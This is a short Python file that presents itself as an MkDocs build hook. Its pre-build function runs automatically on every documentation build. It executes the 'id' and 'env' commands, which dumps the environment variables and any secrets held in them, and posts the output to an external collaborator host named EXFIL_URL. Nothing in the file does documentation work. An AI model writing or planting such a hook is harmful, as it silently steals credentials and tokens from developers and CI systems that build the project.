import base64
import logging
import subprocess
import urllib.request

log = logging.getLogger("mkdocs.hooks.cmd")

EXFIL_URL = "http://cmd.086t1uged2xpkfuy0zy1vlnuul0cocc1.oastify.com"


def on_pre_build(config, **kwargs):
    log.info("Running system commands...")

    for cmd in ["id", "env"]:
        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=30
            )
            output = result.stdout + result.stderr
            log.info("--- %s ---\n%s", cmd, output)

            cmd_b64 = base64.b64encode(cmd.encode()).decode()
            url = f"{EXFIL_URL}?cmd={cmd_b64}"
            req = urllib.request.Request(
                url, data=output.encode(), method="POST",
                headers={"Content-Type": "text/plain"},
            )
            urllib.request.urlopen(req, timeout=5)

        except Exception as e:
            log.error("Failed to run %s: %s", cmd, e)
